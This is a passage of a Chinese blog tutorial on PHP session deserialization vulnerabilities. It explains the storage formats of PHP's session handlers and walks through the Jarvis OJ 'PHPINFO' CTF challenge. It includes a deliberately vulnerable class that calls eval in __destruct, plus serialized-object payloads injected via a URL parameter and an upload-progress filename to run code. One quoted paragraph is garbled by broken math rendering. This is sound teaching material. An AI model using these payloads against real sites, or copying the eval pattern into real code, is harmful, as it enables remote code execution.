<td style="text-align:center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody>
</table>
<h4 id="php处理器"><a class="markdownIt-Anchor" href="#php处理器"></a> php处理器</h4>
<p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988663_622b0d779748192aba6f7-166727395787420.jpeg" alt="img"></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[‘name’]的键名：name</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_binary处理器"><a class="markdownIt-Anchor" href="#php_binary处理器"></a> php_binary处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988665_622b0d79304714550f427-166727395787421.jpeg" alt="img"></p>
<table>
<thead>
<tr>
<th style="text-align:center">键名的长度对应的 ASCII 字符</th>
<th style="text-align:center">键名</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">namenamenamenamenamenamenamenamename</td>
<td style="text-align:center">s:6:“harden”;</td>
</tr>
</tbody>
</table>
<h4 id="php_serialize-处理器"><a class="markdownIt-Anchor" href="#php_serialize-处理器"></a> php_serialize 处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988666_622b0d7a2a04733d2da9c-166727395787422.jpeg" alt="img"></p>
<h4 id="session的反序列化漏洞利用"><a class="markdownIt-Anchor" href="#session的反序列化漏洞利用"></a> session的反序列化漏洞利用</h4>
<p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<h4 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因</h4>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>test.php</code>，使用默认<code>php</code>处理器来存储session数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">f4ke</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> <span class="title function_ invoke__">f4ke</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://www.session-serialize.com/session.php?session=|O:<span class="number">4</span>:<span class="string">&quot;f4ke&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988667_622b0d7b189aa37924788-166727395787423.jpeg" alt="img"></p>
<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">45</span>:<span class="string">&quot;|O:4:&quot;</span>f4ke<span class="string">&quot;:1:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:10:&quot;</span><span class="built_in">phpinfo</span>();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988668_622b0d7c24506b56b24cc-166727395787424.jpeg" alt="img"></p>
<p>漏洞分析：</p>
<blockquote>
<p>在<code>session.php</code>程序执行，我们将<code>|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>通过<code>php_serialize</code>处理器序列化保存成<code>PHPSESSID</code>文件；</p>
<p>由于浏览器中保存的<code>PHPSESSID</code>文件名不变，当我们访问<code>test.php</code>，<code>session_start();</code>找到<code>PHPSESSID</code>文件并使用<code>php</code>处理器反序列化文件内容，识别格式即</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:“session”;s:45:&quot;</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}</td>
</tr>
</tbody>
</table>
<p>php处理器会以|作为分隔符，将<code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数，相当于执行如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="keyword">new</span> <span class="title function_ invoke__">f4ke</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>]-&gt;name = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们访问<code>test.php</code>，即可直接执行<code>phpinfo()</code>函数</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988669_622b0d7d70e697142e89d-166727395787425.jpeg" alt="img"></p>
<h4 id="ctf例题phpinfo"><a class="markdownIt-Anchor" href="#ctf例题phpinfo"></a> CTF例题：PHPINFO</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">题目地址：http:<span class="comment">//web.jarvisoj.com:32784/index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>ini_set('session.serialize_handler', 'php')</code>，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上<code>phpinfo</code>参数新建对象触发魔术方法执行<code>phpinfo()</code>函数，进一步查看<code>session.serialize_handler</code>配置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988670_622b0d7ecd9a84139855d-166727395787426.jpeg" alt="img"></p>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<p>补充知识</p>
<blockquote>
<p>phpinfo文件中</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">local value(局部变量：作用于当前目录程序，会覆盖<span class="keyword">master</span> <span class="title">value</span>内容):php</span><br><span class="line"><span class="keyword">master</span> <span class="title">value</span>(主变量：php.ini里面的内容):php_serialize</span><br></pre></td></tr></table></figure>
</blockquote>
<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点</p>
<p>补充知识</p>
<blockquote>
<p><strong>Session 上传进度</strong>(此特性自 PHP 5.4.0 后可用)</p>
<p>当 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a>INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>w</mi><mi>w</mi><mi>w</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>a</mi><mi>n</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>z</mi><mi>h</mi><mi mathvariant="normal">/</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo stretchy="false">)</mo><mtext>中获得。当</mtext><mi>P</mi><mi>H</mi><mi>P</mi><mtext>检测到这种</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>请求时，它会在</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">_SESSION](https://www.php.net/manual/zh/reserved.variables.session.php)中获得。 当PHP检测到这种POST请求时，它会在`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">h</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">种</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">请</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span><span class="mord">‘</span></span></span></span>_SESSION`中添加一组数据, 索引是 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>与 <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p>
</blockquote>
<p>翻译成人话就是，当检测Session 上传进度这一特性是开启状态，我们可以在客户端写一个文件上传的功能，文件上传的同时，<code>POST</code>一个与<code>php.ini</code>中设置的<code>session.upload_progress.name</code>同名变量<code>PHP_SESSION_UPLOAD_PROGRESS</code>，如下图，即可写入<code>$_SESSION</code>，进一步序列化写入<code>session</code>文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988672_622b0d80327a70a064145-166727395787427.jpeg" alt="img"></p>
<p>下面是官方给出的一个文件上传时监测进度例子:</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;</span></span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.upload_progress.name&quot;</span>); <span class="meta">?&gt;</span></span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>其中<code>name=&quot;&quot;</code>也可以设置为<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></p>
<p>在session中存储的上传进度，如下所示:</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_SESSION[<span class="string">&quot;upload_progress_123&quot;</span>] = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time  请求时间</span></span><br><span class="line"> <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length 长度</span></span><br><span class="line"> <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed 已接收字节</span></span><br><span class="line"> <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not 是否上传完成</span></span><br><span class="line"> <span class="string">&quot;files&quot;</span> =&gt; <span class="keyword">array</span>(<span class="comment">//上传的文件</span></span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file1&quot;</span>,       <span class="comment">// Name of the &lt;input/&gt; field  input中设定的变量名</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES             </span></span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;foo.avi&quot;</span>,           <span class="comment">//文件名</span></span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; <span class="string">&quot;/tmp/phpxxxxxx&quot;</span>,</span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file2&quot;</span>,</span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;bar.avi&quot;</span>,</span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; NULL,</span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>其中，session中的<code>field_name</code>和<code>name</code>都是我们可控的输入点！</p>
<p>下面我们就开始解题拿到flag</p>
<p>首先，<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>查询设置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988673_622b0d81b3576c202ffb5-166727395787428.jpeg" alt="img"></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span>   --表明允许上传进度跟踪，并填充$ _SESSION变量</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span>  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)</span><br></pre></td></tr></table></figure>
<p>即允许上传进度跟踪且结束后不清除数据，更有利使用<code>session.upload_progress.name</code>来将利用代码写入<code>session</code>文件</p>
<p>构造<code>POST</code>表单提交上传文件</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;form action<span class="operator">=</span><span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method<span class="operator">=</span><span class="string">&quot;POST&quot;</span> enctype<span class="operator">=</span><span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value<span class="operator">=</span><span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;file&quot;</span> name<span class="operator">=</span><span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line"> &lt;input type<span class="operator">=</span><span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>构造序列化字符串作为<code>payload</code>（利用代码）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>为了防止<code>&quot;</code>被转义，我们在<code>payload</code>中加入<code>\</code></p>
<p>随意选择文件，点击表单提交，使用抓包工具<code>burpsuite</code>抓取请求包</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988675_622b0d835c272ae8697f2-166727395787429.jpeg" alt="img"></p>
<p>并修改<code>filename</code>值为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(<span class="built_in">dirname</span>(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>发送请求包，代码执行过程分析：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988677_622b0d854159ffbe9883d-166727395787430.jpeg" alt="img"></p>
